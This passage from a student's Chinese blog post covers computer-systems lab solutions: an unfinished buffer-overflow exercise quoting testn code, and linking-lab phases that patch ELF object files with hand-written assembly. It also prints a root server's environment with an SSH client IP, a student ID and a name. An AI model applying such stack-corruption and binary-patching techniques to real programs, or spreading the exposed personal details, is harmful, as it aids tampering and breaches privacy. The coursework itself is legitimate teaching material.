跳转地址小端表示</span><br></pre></td></tr></table></figure><p>但出现了异常：</p><blockquote><p><img src="/2021/computer-architecture-hitlabs/image-20210505094839984.png" alt="image-20210505094839984"></p><p>原因：</p><p>由testn可知，调用getbufn前后uniqueval的返回值要保持不变，否则会引发sabotaged异常。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210505095543967.png" alt="image-20210505095543967"></p><p>模拟C代码为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> val;</span><br><span class="line"> <span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</span><br><span class="line"> val = getbufn();</span><br><span class="line"> <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;KABOOM!: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line">     validate(<span class="number">4</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知是字符串将uniqueval存在栈中的值给破坏了/函数行为被改变。</p><p>未解决。</p></blockquote><p>未完待续。</p><h1 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h1><p>执行<code>./LinkAddress -u 1190200215 喻灿红</code>后：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">env     <span class="number">0x7ffdf24654f0</span>  <span class="number">140728668148976</span></span><br><span class="line">env[<span class="number">0</span>]  *env    <span class="number">0x7ffdf2467648</span>  <span class="number">140728668157512</span></span><br><span class="line">XDG_SESSION_ID=<span class="number">8719</span></span><br><span class="line">env[<span class="number">1</span>]  *env    <span class="number">0x7ffdf246765c</span>  <span class="number">140728668157532</span></span><br><span class="line">HOSTNAME=iZbp1hzujytkmx0eqfmgsuZ</span><br><span class="line">env[<span class="number">2</span>]  *env    <span class="number">0x7ffdf246767d</span>  <span class="number">140728668157565</span></span><br><span class="line">TERM=xterm<span class="number">-256</span>color</span><br><span class="line">env[<span class="number">3</span>]  *env    <span class="number">0x7ffdf2467691</span>  <span class="number">140728668157585</span></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">env[<span class="number">4</span>]  *env    <span class="number">0x7ffdf24676a1</span>  <span class="number">140728668157601</span></span><br><span class="line">HISTSIZE=<span class="number">1000</span></span><br><span class="line">env[<span class="number">5</span>]  *env    <span class="number">0x7ffdf24676af</span>  <span class="number">140728668157615</span></span><br><span class="line">SSH_CLIENT=<span class="number">111.40</span><span class="number">.58</span><span class="number">.130</span> <span class="number">20088</span> <span class="number">22</span></span><br><span class="line">env[<span class="number">6</span>]  *env    <span class="number">0x7ffdf24676d1</span>  <span class="number">140728668157649</span></span><br><span class="line">OLDPWD=/root/code</span><br><span class="line">env[<span class="number">7</span>]  *env    <span class="number">0x7ffdf24676e3</span>  <span class="number">140728668157667</span></span><br><span class="line">SSH_TTY=/dev/pts/<span class="number">0</span></span><br><span class="line">env[<span class="number">8</span>]  *env    <span class="number">0x7ffdf24676f6</span>  <span class="number">140728668157686</span></span><br><span class="line">USER=root</span><br><span class="line">env[<span class="number">9</span>]  *env    <span class="number">0x7ffdf2467700</span>  <span class="number">140728668157696</span></span><br><span class="line">LD_LIBRARY_PATH=/usr/local/gcc<span class="number">-3.4</span><span class="number">.3</span>/lib:</span><br><span class="line">env[<span class="number">10</span>] *env    <span class="number">0x7ffdf246772a</span>  <span class="number">140728668157738</span></span><br><span class="line">LS_COLORS=rs=<span class="number">0</span>:di=<span class="number">38</span>;<span class="number">5</span>;<span class="number">27</span>:ln=<span class="number">38</span>;<span class="number">5</span>;<span class="number">51</span>:mh=<span class="number">44</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">15</span>:pi=<span class="number">40</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">11</span>:so=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:<span class="keyword">do</span>=<span class="number">38</span>;<span class="number">5</span>;<span class="number">5</span>:bd=<span class="number">48</span>;<span class="number">5</span>;<span class="number">232</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">11</span>:cd=<span class="number">48</span>;<span class="number">5</span>;<span class="number">232</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">3</span>:<span class="keyword">or</span>=<span class="number">48</span>;<span class="number">5</span>;<span class="number">232</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:mi=<span class="number">05</span>;<span class="number">48</span>;<span class="number">5</span>;<span class="number">232</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">15</span>:su=<span class="number">48</span>;<span class="number">5</span>;<span class="number">196</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">15</span>:sg=<span class="number">48</span>;<span class="number">5</span>;<span class="number">11</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">16</span>:ca=<span class="number">48</span>;<span class="number">5</span>;<span class="number">196</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">226</span>:tw=<span class="number">48</span>;<span class="number">5</span>;<span class="number">10</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">16</span>:ow=<span class="number">48</span>;<span class="number">5</span>;<span class="number">10</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">21</span>:st=<span class="number">48</span>;<span class="number">5</span>;<span class="number">21</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">15</span>:ex=<span class="number">38</span>;<span class="number">5</span>;<span class="number">34</span>:*.tar=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tgz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.arc=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.arj=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.taz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lha=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lz4=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lzh=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lzma=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tlz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.txz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tzo=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.t7z=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.zip=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.z=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.Z=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.dz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.gz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lrz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lzo=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.xz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.bz2=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.bz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tbz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tbz2=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.deb=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.rpm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.jar=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.war=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.ear=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.sar=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.rar=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.alz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.ace=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.zoo=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.cpio=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*<span class="number">.7</span>z=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.rz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.cab=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.jpg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.jpeg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.gif=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.bmp=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.pbm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.pgm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.ppm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.tga=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.xbm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.xpm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.tif=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.tiff=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.png=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.svg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.svgz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mng=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.pcx=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mov=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mpg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mpeg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.m2v=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mkv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.webm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.ogm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mp4=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.m4v=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mp4v=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.vob=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.qt=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.nuv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.wmv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.asf=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.rm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.rmvb=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.flc=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.avi=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.fli=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.flv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.gl=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.dl=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.xcf=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.xwd=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.yuv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.cgm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.emf=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.axv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.anx=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.ogv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.ogx=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.aac=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.au=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.flac=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.mid=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.midi=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.mka=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.mp3=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.mpc=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.ogg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.ra=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.wav=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.axa=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.oga=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.spx=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.xspf=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:</span><br><span class="line">env[<span class="number">11</span>] *env    <span class="number">0x7ffdf2467de2</span>  <span class="number">140728668159458</span></span><br><span class="line">MAVEN_HOME=/opt/maven/apache-maven<span class="number">-3.6</span><span class="number">.3</span></span><br><span class="line">env[<span class="number">12</span>] *env    <span class="number">0x7ffdf2467e0b</span>  <span class="number">140728668159499</span></span><br><span class="line">MAIL=/var/spool/mail/root</span><br><span class="line">env[<span class="number">13</span>] *env    <span class="number">0x7ffdf2467e25</span>  <span class="number">140728668159525</span></span><br><span class="line">PATH=/opt/maven/apache-maven<span class="number">-3.6</span><span class="number">.3</span>/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/local/java/jdk<span class="number">-16</span>/bin:/root/.local/bin:/root/bin:/root/.local/bin</span><br><span class="line">env[<span class="number">14</span>] *env    <span class="number">0x7ffdf2467ec5</span>  <span class="number">140728668159685</span></span><br><span class="line">PWD=/root/code/lab5</span><br><span class="line">env[<span class="number">15</span>] *env    <span class="number">0x7ffdf2467ed9</span>  <span class="number">140728668159705</span></span><br><span class="line">JAVA_HOME=/usr/local/java/jdk<span class="number">-16</span></span><br><span class="line">env[<span class="number">16</span>] *env    <span class="number">0x7ffdf2467efa</span>  <span class="number">140728668159738</span></span><br><span class="line">LANG=en_US.UTF<span class="number">-8</span></span><br><span class="line">env[<span class="number">17</span>] *env    <span class="number">0x7ffdf2467f0b</span>  <span class="number">140728668159755</span></span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">env[<span class="number">18</span>] *env    <span class="number">0x7ffdf2467f22</span>  <span class="number">140728668159778</span></span><br><span class="line">SHLVL=<span class="number">1</span></span><br><span class="line">env[<span class="number">19</span>] *env    <span class="number">0x7ffdf2467f2a</span>  <span class="number">140728668159786</span></span><br><span class="line">HOME=/root</span><br><span class="line">env[<span class="number">20</span>] *env    <span class="number">0x7ffdf2467f35</span>  <span class="number">140728668159797</span></span><br><span class="line">LOGNAME=root</span><br><span class="line">env[<span class="number">21</span>] *env    <span class="number">0x7ffdf2467f42</span>  <span class="number">140728668159810</span></span><br><span class="line">CLASSPATH=/usr/local/java/jdk<span class="number">-16</span>/lib</span><br><span class="line">env[<span class="number">22</span>] *env    <span class="number">0x7ffdf2467f67</span>  <span class="number">140728668159847</span></span><br><span class="line">SSH_CONNECTION=<span class="number">111.40</span><span class="number">.58</span><span class="number">.130</span> <span class="number">20088</span> <span class="number">172.25</span><span class="number">.37</span><span class="number">.193</span> <span class="number">22</span></span><br><span class="line">env[<span class="number">23</span>] *env    <span class="number">0x7ffdf2467f9b</span>  <span class="number">140728668159899</span></span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">env[<span class="number">24</span>] *env    <span class="number">0x7ffdf2467fbe</span>  <span class="number">140728668159934</span></span><br><span class="line">XDG_RUNTIME_DIR=/run/user/<span class="number">0</span></span><br><span class="line">env[<span class="number">25</span>] *env    <span class="number">0x7ffdf2467fda</span>  <span class="number">140728668159962</span></span><br><span class="line">_=./LinkAddress</span><br><span class="line">big <span class="built_in">array</span>       <span class="number">0x40602140</span>      <span class="number">1080041792</span></span><br><span class="line">huge <span class="built_in">array</span>      <span class="number">0x602140</span>        <span class="number">6299968</span></span><br><span class="line">global  <span class="number">0x602080</span>        <span class="number">6299776</span></span><br><span class="line">gint0   <span class="number">0x60212c</span>        <span class="number">6299948</span></span><br><span class="line">glong   <span class="number">0x602088</span>        <span class="number">6299784</span></span><br><span class="line">cstr    <span class="number">0x6020a0</span>        <span class="number">6299808</span></span><br><span class="line">pstr    <span class="number">0x400d80</span>        <span class="number">4197760</span></span><br><span class="line">gc      <span class="number">0x400dac</span>        <span class="number">4197804</span></span><br><span class="line">cc      <span class="number">0x400dc0</span>        <span class="number">4197824</span></span><br><span class="line">local <span class="built_in">int</span> <span class="number">0</span>     <span class="number">0x7ffdf246539c</span>  <span class="number">140728668148636</span></span><br><span class="line">local <span class="built_in">int</span> <span class="number">1</span>     <span class="number">0x7ffdf2465398</span>  <span class="number">140728668148632</span></span><br><span class="line">local static <span class="built_in">int</span> <span class="number">0</span>      <span class="number">0x602130</span>        <span class="number">6299952</span></span><br><span class="line">local static <span class="built_in">int</span> <span class="number">1</span>      <span class="number">0x602110</span>        <span class="number">6299920</span></span><br><span class="line">local astr      <span class="number">0x7ffdf2464fa0</span>  <span class="number">140728668147616</span></span><br><span class="line">local pstr      <span class="number">0x400e30</span>        <span class="number">4197936</span></span><br><span class="line">argc    <span class="number">0x7ffdf2464f9c</span>  <span class="number">140728668147612</span></span><br><span class="line">argv    <span class="number">0x7ffdf24654c8</span>  <span class="number">140728668148936</span></span><br><span class="line">argv[<span class="number">0</span>]     <span class="number">7f</span>fdf2467622</span><br><span class="line">argv[<span class="number">1</span>]     <span class="number">7f</span>fdf2467630</span><br><span class="line">argv[<span class="number">2</span>]     <span class="number">7f</span>fdf2467633</span><br><span class="line">argv[<span class="number">3</span>]     <span class="number">7f</span>fdf246763e</span><br><span class="line">argv[<span class="number">0</span>] <span class="number">0x7ffdf2467622</span>  <span class="number">140728668157474</span></span><br><span class="line">./LinkAddress</span><br><span class="line">argv[<span class="number">1</span>] <span class="number">0x7ffdf2467630</span>  <span class="number">140728668157488</span></span><br><span class="line">-u</span><br><span class="line">argv[<span class="number">2</span>] <span class="number">0x7ffdf2467633</span>  <span class="number">140728668157491</span></span><br><span class="line"><span class="number">1190200215</span></span><br><span class="line">argv[<span class="number">3</span>] <span class="number">0x7ffdf246763e</span>  <span class="number">140728668157502</span></span><br><span class="line">喻灿红</span><br><span class="line">p1      <span class="number">0x7f57a5865010</span>  <span class="number">140014415925264</span></span><br><span class="line">p2      <span class="number">0x7f57b5e26010</span>  <span class="number">140014690394128</span></span><br><span class="line">p3      <span class="number">0x7f57b5e05010</span>  <span class="number">140014690258960</span></span><br><span class="line">p4      <span class="number">0x7f5765864010</span>  <span class="number">140013342179344</span></span><br><span class="line">p5      (nil)   <span class="number">0</span></span><br><span class="line">show_pointer    <span class="number">0x400738</span>        <span class="number">4196152</span></span><br><span class="line">useless <span class="number">0x40072d</span>        <span class="number">4196141</span></span><br><span class="line">main    <span class="number">0x400768</span>        <span class="number">4196200</span></span><br><span class="line">exit    <span class="number">0x400630</span>        <span class="number">4195888</span></span><br><span class="line">printf  <span class="number">0x4005f0</span>        <span class="number">4195824</span></span><br><span class="line">malloc  <span class="number">0x400620</span>        <span class="number">4195872</span></span><br><span class="line">free    <span class="number">0x4005c0</span>        <span class="number">4195776</span></span><br><span class="line">strcpy  <span class="number">0x4005d0</span>        <span class="number">4195792</span></span><br></pre></td></tr></table></figure><h2 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h2><p>查看phase1.o的汇编代码：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210519215620823.png" alt="image-20210519215620823"></p><p>得函数会将要打印的内容放入eax中，这个地址需要重定位到<code>.data+0x53</code>的位置。</p><p>通过查看phase.o的elf可得<code>.data</code>的偏移为0x60：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210519221731703.png" alt="image-20210519221731703"></p><p>将<code>0x60+0x53=0xB3</code>位置开始的内容改为学号，最后要用<code>00</code>结束：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210519222709855.png" alt="image-20210519222709855"></p><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210519222612164.png" alt="image-20210519222612164"></p><h2 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h2><p>有三种可选方案：</p><ol><li>在do_phase中调用puts函数。<br>但因为puts函数是外部符号，需要新建一个重定位项，违背了只能修改.text节的实验要求，故舍弃。</li><li>压入学号字符串，压入串地址作为参数调用包含puts的那个函数。<br>如下。</li><li>直接jmp到puts前push参数的语句。</li></ol><p>phase2.o的汇编代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">phase2.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;mFwieYqD&gt;:</span><br><span class="line">   0:    f3 0f 1e fb              endbr32 </span><br><span class="line">   4:    55                       push   %ebp</span><br><span class="line">   5:    89 e5                    mov    %esp,%ebp</span><br><span class="line">   7:    83 ec 08                 sub    $0x8,%esp</span><br><span class="line">   a:    83 ec 08                 sub    $0x8,%esp</span><br><span class="line">   d:    68 00 00 00 00           push   $0x0</span><br><span class="line">  12:    ff 75 08                 pushl  0x8(%ebp)</span><br><span class="line">  15:    e8 fc ff ff ff           call   16 &lt;mFwieYqD+0x16&gt;</span><br><span class="line">  1a:    83 c4 10                 add    $0x10,%esp</span><br><span class="line">  1d:    85 c0                    test   %eax,%eax</span><br><span class="line">  1f:    75 10                    jne    31 &lt;mFwieYqD+0x31&gt;</span><br><span class="line">  21:    83 ec 0c                 sub    $0xc,%esp</span><br><span class="line">  24:    ff 75 08                 pushl  0x8(%ebp)</span><br><span class="line">  27:    e8 fc ff ff ff           call   28 &lt;mFwieYqD+0x28&gt;</span><br><span class="line">  2c:    83 c4 10                 add    $0x10,%esp</span><br><span class="line">  2f:    eb 01                    jmp    32 &lt;mFwieYqD+0x32&gt;</span><br><span class="line">  31:    90                       nop</span><br><span class="line">  32:    c9                       leave  </span><br><span class="line">  33:    c3                       ret    </span><br><span class="line"></span><br><span class="line">00000034 &lt;do_phase&gt;:</span><br><span class="line">  34:    f3 0f 1e fb              endbr32 </span><br><span class="line">  38:    55                       push   %ebp</span><br><span class="line">  39:    89 e5                    mov    %esp,%ebp</span><br><span class="line">  3b:    90                       nop</span><br><span class="line">  3c:    90                       nop</span><br><span class="line">  3d:    90                       nop</span><br><span class="line">  3e:    90                       nop</span><br><span class="line">  3f:    90                       nop</span><br><span class="line">  40:    90                       nop</span><br><span class="line">  41:    90                       nop</span><br><span class="line">  42:    90                       nop</span><br><span class="line">  43:    90                       nop</span><br><span class="line">  44:    90                       nop</span><br><span class="line">  45:    90                       nop</span><br><span class="line">  46:    90                       nop</span><br><span class="line">  47:    90                       nop</span><br><span class="line">  48:    90                       nop</span><br><span class="line">  49:    90                       nop</span><br><span class="line">  4a:    90                       nop</span><br><span class="line">  4b:    90                       nop</span><br><span class="line">  4c:    90                       nop</span><br><span class="line">  4d:    90                       nop</span><br><span class="line">  4e:    90                       nop</span><br><span class="line">  4f:    90                       nop</span><br><span class="line">  50:    90                       nop</span><br><span class="line">  51:    90                       nop</span><br><span class="line">  52:    90                       nop</span><br><span class="line">  53:    90                       nop</span><br><span class="line">  54:    90                       nop</span><br><span class="line">  55:    90                       nop</span><br></pre></td></tr></table></figure><p>分析可得，需要在do_phase函数中创建一个学号字符串，然后将该字符串的地址作为参数压栈，调用函数mFwieYqD。</p><p>编写汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub $0xc, %esp</span><br><span class="line">movl $0x30393131, -0xc(%ebp)</span><br><span class="line">movl $0x32303032, -0x8(%ebp)</span><br><span class="line">movl $0x00003531, -0x4(%ebp)</span><br><span class="line">lea -0xc(%ebp), %eax</span><br><span class="line">push %eax</span><br><span class="line">call 0x00   # 先随便填一个值</span><br></pre></td></tr></table></figure><p>汇编成机器码后修改phase2.o：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210525211821409.png" alt="image-20210525211821409"></p><p>成功压入学号字符串参数：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210525204141593.png" alt="image-20210525204141593"></p><p>接着根据函数mFwieYqD的偏移量来确定call的偏移量，读elf得mFwieYqD在.text节的0偏移处：</p><p><img 